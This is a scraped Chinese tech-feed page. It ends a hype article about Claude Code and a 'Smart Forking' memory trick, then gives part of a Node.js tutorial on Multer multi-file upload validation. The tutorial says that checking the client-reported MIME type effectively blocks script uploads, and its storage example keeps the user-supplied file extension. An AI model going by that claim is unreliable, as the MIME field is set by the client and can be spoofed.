<p>不过从使用体验上来说，你不需要重复输入，不用自己回忆，模型就能「想起」你几个月前做过什么，这已经满足人类对「记忆」的全部直觉定义了。</p>
<p>所以可以说，它让 Claude 拥有了「永久记忆」。</p>
<p>和普通提示相比，成功率到底如何？这种方法适用于哪些使用场景？</p>
<p>分享这一方法的网友 Zac 介绍，他个人使用时，成功率为 100%。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41828cb78e264337b57694be355562f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=TM6zUFFAqoZDjGdA8G2cV73dbTs%3D" alt="" loading="lazy"/></p>
<p>有人质疑说，这个功能比起 skills 好在哪里？</p>
<p>关键在于，Smart forking 解决了目前 LLM 会话最大的痛点——上下文丢失，这样，就能自动生出正确的对话了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e98902fbd36f440386da86ff3e4dd898~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=tpuVuw%2F2nuLaB392Y4OLz7ef8DM%3D" alt="" loading="lazy"/></p>
<p>这就是 AI 带给大家的又一个惊喜——此后，每次和 AI 对话中的智慧得以保留；事半功倍，「懒人」求之不得！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f5a6fa3fc5c438da8598a5e3521bd39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=bSTrYGlKRvKNLN%2FDU6K99q0qqb8%3D" alt="" loading="lazy"/></p>
<p><strong>「<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c5fc213179c454d9ae7a41880ec35b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=u5Di0Ju6K4dNuCI%2BmCXBdK7Cv8g%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「野生开发者 vs 官方，哪个强」</strong></p>
<p>所以，这种 Smart Forking，和传说中 Anthropic 官方要做的「永久大脑」知识库，孰优孰劣呢？</p>
<p>可以看到，爆料中 Anthropic 要做的「知识库」，原理就是把信息分门别类存进不同的「记忆本子」，让 Claude 主动去翻这些知识库，调取相关背景，补充新的偏好、决策和经验。</p>
<p><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">视频详情</a></p>
<p>因此，从设计理念上看，这套知识库更像是**自上而下的「结构化长期记忆」——**由 Anthropic 官方定义规则，用户按场景选择使用哪个知识库，让 Claude 更清楚你在干什么。</p>
<p>而 Smart Forking 与之恰恰相反，是一种**「自下而上的「上下文继承」。」**</p>
<p>它不依赖官方记忆系统，而是直接从你过去真实发生过的 Claude Code 会话中，自动找出最相关的一次，然后完整继承那段上下文继续干活。</p>
<p>前者是把记忆整理好，再喂给模型；后者是直接找到最该被记住的那段记忆。</p>
<p>有趣的是，这两种路线并不冲突，甚至极有可能在未来融合。</p>
<p>原因在于，知识库解决的是「长期、稳定、可复用的记忆」，而 Smart Forking 解决的是「强上下文、强时序的工作记忆」。一个是 Claude 的长期记忆，一个更接近人类的情景记忆。</p>
<p>这一次官方和个人开发者不约而同的尝试，或许已经透露出这样一个事实：下一代 AI 的分水岭，不是参数规模，而是记忆的组织方式。</p>
<p>而这个新方法只是最近 Claude 狂热的最新例子。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75810a59986548b8bfe66a86d1591b5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=sOZTefzDoi3ohMD0veuffVHGLRw%3D" alt="" loading="lazy"/></p>
<p><strong>「Claude Code 破圈」</strong></p>
<p><strong>「码农惊呼「太恐怖」」</strong></p>
<p>相信你肯定已经感受到，最近 Claude 给全世界的一波波暴击。</p>
<p>《华尔街日报》是这样描述的：</p>
<p>Anthropic 的 Claude 正以雷霆之势席卷 AI 领域，成功破圈，席卷全民！</p>
<p>开发者与业余爱好者纷纷惊叹：Claude Code 的病毒式传播盛况，堪比生成式 AI 降临的史诗时刻！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d2f4a5675784feeb276e684ee46fda4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=aY6mMuJ729W1nU9Fu%2BDEZLLAFFU%3D" alt="" loading="lazy"/></p>
<p>不止是美国，Claude Code 在英国也引起了难以置信的轰动。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f97a2f062804aa6a356e5ce414591c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=6GHe%2FklKoIjWQWeTMcetE5m5WOg%3D" alt="" loading="lazy"/></p>
<p>美国人把这种现象叫作「Claude 入坑」（Claude-pilled）。</p>
<p>这个词是指软件工程师、高管和投资人把工作交给 Claude，然后亲眼见证人生中难忘一刻：</p>
<p>即使在这个强人工智能工具遍地开花的时代，他们仍会目睹这台思维机器的惊人能力。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40c35736f598401caa04284ed09282f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=0xsuiUhEffiuxBD53eOdZvhXkRs%3D" alt="" loading="lazy"/></p>
<p>不少程序员假期里直接「Claude 上头」，狂测 Anthropic 最新模型 Claude Opus 4.5 的本事；他们都迷上 Claude Code 这个桌面编程工具。</p>
<p>科技公司把代码 AI 纳入工作流已经好多年了。以前，AI 常被拿来跟初级软件工程师比。</p>
<p>但这次 Claude 最新版本一鸣惊人、非同凡响。</p>
<p>云计算巨头 Vercel 的首席技术官 Malte Ubl 说，他用一周就搞定了一个复杂项目，但要是没 AI，他大概得干上一年。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70e8529300644acebe20482ec95b5904~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=VYIeP8JTICU8heZFDek0D0KMVzA%3D" alt="" loading="lazy"/></p>
<p>休假期间，Ubl 每天花 10 个小时做新软件，他说每次让它跑一轮、看到结果，都会有一种内啡肽猛冲的爽感，跟在拉斯维加斯拉玩老虎机差不多。</p>
<p>这个月，Claude 狂热已成燎原之势，火到破圈。</p>
<p>很多人跑到社交媒体上分享：自己从没学过编程，却做出了人生第一个软件的过程。</p>
<p>英国销量最高的报纸之一《<strong>「每日电讯报」</strong>》，报道了 Ben Guerin 的故事。</p>
<p>为了让大家意识到本地酒吧离谱的「营业税」（business rates），他用 Claude  Code 六小时后，上线了相关网站。24 小时内，访问人数就超过了 10 万。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d11a98824d34959938391b5f40c6a3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=%2BAQz0VaIFJuU7dnhDE%2F4nFfSfGA%3D" alt="" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ismypubfucked.com%2F" target="_blank" title="https://www.ismypubfucked.com/" ref="nofollow noopener noreferrer">www.ismypubfucked.com/</a> 用地图标出英格兰和威尔士的每一家酒吧，正在遭遇的税负上涨</p>
<p>「我自己一行代码都没写，」Guerin 说。「最大的限制是想象力。」</p>
<p>对一些软件工程师来说，它几乎把那种苦活儿都替掉了，从此不必在命令行 / 终端窗口里一串一串敲字符。</p>
<p>现在，用户只要把自己想做的应用描述清楚，按下回车；然后，往后一靠，看着彩色代码像瀑布一样在屏幕上哗啦往下刷。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01ae27b4f45543a6a42ee1edbc9328cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=2Gdm%2BFH8MQTpzNKoFfiQ%2BUmC7DA%3D" alt="" loading="lazy"/></p>
<p>一些用户在惊叹之余也感到一丝悲凉：这款程序竟能轻易复现他们耗费整个职业生涯才掌握的专业技能。</p>
<p>从中学生时代起，税务平台 Awaken Tax 的首席执行官 Andrew Duca 就开始编程，有些破防：「我穷尽一生磨练的技能，竟被 Claude Code 瞬间超越。」</p>
<p>即便是横扫各大榜单的 Gemini，也难掩 Claude 的光芒——</p>
<p>市场分析公司 Similarweb 和 Sensor Tower 分别指出：</p>
<p>去年 12 月 Claude 全网用户量同比翻倍，其桌面端日均独立访客量环比上月增长 12%。</p>
<p>Andrew Duca 透露，原本计划扩招软件工程师的团队已暂停招聘。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f33c660fa8045ef8d1b647b45b0a198~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=W6YkPTwpe%2Bb%2F0Y08jNp%2BDQUfx3g%3D" alt="" loading="lazy"/></p>
<p><strong>「硅谷异类，再起狂澜」</strong></p>
<p>但如果说 Claude Code 已让职业软件工程师开始背后发凉，那这还只是开始。</p>
<p>别看名字里有「code」，大家用 Claude Code 做的也不只写代码：</p>
<ul>
<li>人们正利用它分析联邦经济数据</li>
<li>从损坏的硬盘中恢复婚礼照片</li>
<li>批量回复电子邮件甚至订购食物</li>
</ul>
<p>在社交平台 X 上，Shopify 的首席执行官 Tobi Lütke 透露，他曾用它编写软件来分析自己最近收到的核磁共振成像结果。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bce00493d7904fd382d37ec568cef18d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=gq0Nrdts84NTd6CFc17Wj4oC1jo%3D" alt="" loading="lazy"/></p>
<p>「甚至有人给它连上了网络摄像头，用来观察自家番茄植株的生长情况，」Claude Code 项目负责人 Boris Cherny 说道，「这与此前的人工智能产品截然不同。」</p>
<p>于是，Anthropic 上周又发布了一个 Cowork，让所有会用电脑的人也享受到同样的能力。</p>
<p>这是新的篇章。正如商业 AI 初创公司 Retool 的首席执行官 David Hsu 对媒体所言：更大的故事，将在 AI 突破软件工程领域边界时上演。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/527d939ebb754716af7efe2e7e14d870~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=z%2FR0TEsjKV9vGGzT8KTg7eV2%2Ffg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6b4844eee9a4ab0b987be3546dca55a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509883&amp;x-signature=Y6X7%2B9Xi4dqDfTZx0IANyh6Jw9U%3D" alt="" loading="lazy"/></p>
<p><strong>「One  More Thing」</strong></p>
<p>当我们把 Claude Code 相关报道输入 Gemini，要求从「<strong>「外星人视角」</strong>」切入报道，AI 如此写道：</p>
<p>观察日志 2026.01.20：碳基生物正在发生一种奇特的「交权仪式」。 他们不再满足于向硅基智能提问，而是主动打开了他们计算机最底层的「终端」（Terminal）权限，像献上城门钥匙一样，邀请 Claude Code 直接接管操作系统。</p>
<p>他们称之为效率，我们称之为同化。</p>
<p>是效率还是同化，你怎么看？</p>
<p>参考资料：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wsj.com%2Ftech%2Fai%2Fanthropic-claude-code-ai-7a46460e" target="_blank" title="https://www.wsj.com/tech/ai/anthropic-claude-code-ai-7a46460e" ref="nofollow noopener noreferrer">www.wsj.com/tech/ai/ant…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.telegraph.co.uk%2Fbusiness%2F2026%2F01%2F18%2Fsilicon-valley-misfits-fixing-worlds-productivity-slump%2F" target="_blank" title="https://www.telegraph.co.uk/business/2026/01/18/silicon-valley-misfits-fixing-worlds-productivity-slump/" ref="nofollow noopener noreferrer">www.telegraph.co.uk/business/20…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FPerceptualPeak%2Fstatus%2F2012741829683224584" target="_blank" title="https://x.com/PerceptualPeak/status/2012741829683224584" ref="nofollow noopener noreferrer">x.com/PerceptualP…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：文件上传与处理系统 —— 多文件上传与验证]]></title>    <link>https://juejin.cn/post/7597270795211751464</link>    <guid>https://juejin.cn/post/7597270795211751464</guid>    <pubDate>2026-01-20T10:43:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795211751464" data-draft-id="7597270795211735080" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Node.js 编程实战：文件上传与处理系统 —— 多文件上传与验证"/> <meta itemprop="keywords" content="后端,前端,Node.js"/> <meta itemprop="datePublished" content="2026-01-20T10:43:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Node.js 编程实战：文件上传与处理系统 —— 多文件上传与验证
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:43:17.000Z" title="Tue Jan 20 2026 10:43:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在实际业务系统中，<strong>文件上传</strong>几乎是必不可少的功能场景之一，例如图片上传、附件提交、批量资料导入等。而相比单文件上传，<strong>多文件上传与安全验证</strong>对系统的稳定性与安全性提出了更高要求。</p>
</blockquote>
<p>本文将基于 Node.js，系统讲解一个<strong>多文件上传与验证机制的设计与实现思路</strong>，适用于后台管理系统、博客系统、企业应用等多种场景。</p>
<hr/>
<h2 data-id="heading-0">一、多文件上传的常见业务场景</h2>
<p>多文件上传在实际项目中非常常见，例如：</p>
<ul>
<li>• 图片批量上传（商品图、相册）</li>
<li>• 文档附件上传（合同、报告）</li>
<li>• 批量导入文件（Excel、CSV）</li>
<li>• 用户资料打包上传</li>
</ul>
<p>这些场景通常对上传系统提出以下要求：</p>
<ul>
<li>• 支持同时上传多个文件</li>
<li>• 限制文件类型与大小</li>
<li>• 防止恶意文件上传</li>
<li>• 提供统一的文件处理与存储机制</li>
</ul>
<hr/>
<h2 data-id="heading-1">二、Node.js 文件上传方案选型</h2>
<p>在 Node.js 生态中，最常用的文件上传中间件是 <strong>multer</strong>，它基于 <code>multipart/form-data</code>，具有以下优点：</p>
<ul>
<li>• 支持单文件与多文件上传</li>
<li>• 支持内存存储和磁盘存储</li>
<li>• 易于扩展文件校验逻辑</li>
<li>• 与 Express / Koa 生态兼容良好</li>
</ul>
<p>在本实战中，我们以 <strong>Express + Multer</strong> 为例进行说明。</p>
<hr/>
<h2 data-id="heading-2">三、多文件上传基础实现</h2>
<h3 data-id="heading-3">1️⃣ 安装依赖</h3>
<pre><code class="hljs">npm install express multer
</code></pre>
<hr/>
<h3 data-id="heading-4">2️⃣ 基本多文件上传配置</h3>
<p>使用 <code>upload.array()</code> 即可支持多文件上传：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">'multer'</span>);

<span class="hljs-comment">// 文件存储配置</span>
<span class="hljs-keyword">const</span> storage = multer.<span class="hljs-title function_">diskStorage</span>({
  <span class="hljs-attr">destination</span>: <span class="hljs-function">(<span class="hljs-params">req, file, cb</span>) =&gt;</span> {
    <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">'uploads/'</span>);
  },
  <span class="hljs-attr">filename</span>: <span class="hljs-function">(<span class="hljs-params">req, file, cb</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> ext = file.<span class="hljs-property">originalname</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>).<span class="hljs-title function_">pop</span>();
    <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-built_in">Date</span>.now()}</span>-<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random().toString(<span class="hljs-number">16</span>).slice(<span class="hljs-number">2</span>)}</span>.<span class="hljs-subst">${ext}</span>`</span>);
  }
});

<span class="hljs-keyword">const</span> upload = <span class="hljs-title function_">multer</span>({ storage });
</code></pre>
<p>路由使用方式：</p>
<pre><code class="hljs language-php" lang="php">app.<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">'/upload'</span>, upload.<span class="hljs-keyword">array</span>(<span class="hljs-string">'files'</span>, <span class="hljs-number">5</span>), (req, res) =&gt; {
  res.<span class="hljs-title function_ invoke__">json</span>({
<span class="hljs-attr">    message</span>: <span class="hljs-string">'上传成功'</span>,
<span class="hljs-attr">    files</span>: req.files
  });
});
</code></pre>
<p>这里的 <code>5</code> 表示最多允许上传 5 个文件。</p>
<hr/>
<h2 data-id="heading-5">四、文件类型验证（安全核心）</h2>
<p>仅靠前端限制是不安全的，<strong>后端必须进行文件类型校验</strong>。</p>
<h3 data-id="heading-6">1️⃣ MIME 类型校验</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> allowedTypes = [<span class="hljs-string">'image/jpeg'</span>, <span class="hljs-string">'image/png'</span>, <span class="hljs-string">'application/pdf'</span>];

<span class="hljs-keyword">const</span> upload = <span class="hljs-title function_">multer</span>({
  storage,
  <span class="hljs-attr">fileFilter</span>: <span class="hljs-function">(<span class="hljs-params">req, file, cb</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!allowedTypes.<span class="hljs-title function_">includes</span>(file.<span class="hljs-property">mimetype</span>)) {
      <span class="hljs-title function_">cb</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'不支持的文件类型'</span>));
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);
    }
  }
});
</code></pre>
<p>这样可以有效阻止脚本文件、可执行文件上传。</p>
<hr/>
<h3 data-id="heading-7">2️⃣ 文件扩展名双重校验（推荐）</h3>
<pre><code class="hljs language-scss" lang="scss">const path = <span class="hljs-built_in">require</span>('path');

function <span class="hljs-built_in">checkFileType</span>(file) {
  const ext = path<span class="hljs-selector-class">.extname</span>(file.originalname)<span class="hljs-selector-class">.toLowerCase</span>();
  return <span class="hljs-selector-attr">[<span class="hljs-string">'.jpg'</span>, <span class="hljs-string">'.png'</span>, <span class="hljs-string">'.pdf'</span>]</span><span class="hljs-selector-class">.includes</span>(ext);
}
</code></pre>
<p>在 <code>fileFilter</code> 中同时校验 MIME 和扩展名，可进一步增强安全性。</p>
<hr/>
<h2 data-id="heading-8">五、文件大小与数量限制</h2>
<h3 data-id="heading-9">1️⃣ 单文件大小限制</h3>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">upload</span> = multer({
  storage,
  limits: {
    fileSize: 2 * 1024 * 1024 // 2MB
  }
})<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h3 data-id="heading-10">2️⃣ 多文件总数限制</h3>
<p><code>upload.array('files', maxCount)</code> 可限制最大文件数：</p>
<pre><code class="hljs language-c" lang="c">upload.<span class="hljs-built_in">array</span>(<span class="hljs-string">'files'</span>, <span class="hljs-number">10</span>)
</code></pre>
<p>当超出限制时，Multer 会自动抛出错误。</p>
<hr/>
<h2 data-id="heading-11">六、统一错误处理机制</h2>
<p>在文件上传场景中，错误处理尤为重要，例如：</p>
<ul>
<li>• 文件过大</li>
<li>• 文件类型不合法</li>
<li>• 上传数量超限</li>
</ul>
<p>示例统一处理：</p>
<pre><code class="hljs language-javascript" lang="javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/upload'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  upload.<span class="hljs-title function_">array</span>(<span class="hljs-string">'files'</span>, <span class="hljs-number">5</span>)(req, res, <span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (err) {
      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: err.<span class="hljs-property">message</span> });
    }
    res.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">message</span>: <span class="hljs-string">'上传成功'</span> });
  });
});
</code></pre>
<p>通过这种方式，可以给前端明确的错误提示。</p>
<hr/>
<h2 data-id="heading-12">七、上传后的文件信息处理</h2>
<p>成功上传后，通常需要：</p>
<ul>
<li>• 将文件信息写入数据库</li>
<li>• 返回文件访问地址</li>
<li>• 绑定业务数据（如文章、用户）</li>
</ul>
<p>示例返回结构：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"filename"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1674039200-abc123.png"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"size"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">34567</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/uploads/1674039200-abc123.png"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>前端可直接用于展示或后续处理。</p>
<hr/>
<h2 data-id="heading-13">八、性能与安全优化建议</h2>
<p>在生产环境中，多文件上传系统还需要进一步优化：</p>
